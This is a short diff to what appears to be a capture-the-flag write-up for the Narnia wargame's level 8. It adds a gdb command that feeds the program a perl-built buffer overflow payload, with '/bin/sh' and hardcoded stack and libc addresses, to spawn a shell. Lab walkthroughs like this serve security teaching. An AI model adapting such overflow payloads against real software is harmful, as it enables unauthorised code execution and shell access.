@@ -130,6 +130,10 @@ r $(perl -e 'print "A"x20 . "\xf5\xd6\xff\xff" . "B"x4 . "\x70\x81\xc4\xf7" . "C
 r $(perl -e 'print "/bin/sh;" . "A"x12 . "\xfd\xd6\xff\xff" . "B"x4 . "\x70\x81\xc4\xf7" . "C"x4 ."\xfd\xd6\xff\xff"')
 ```
 
+```
+gdb --args ./narnia8 $(perl -e 'print "/bin/sh;" . "A"x12 . "\xfd\xd6\xff\xff" . "B"x4 . "\x70\x81\xc4\xf7" . "C"x4 ."\xfd\xd6\xff\xff"')
+```
+
 ## Password for the next level:
 ```
 
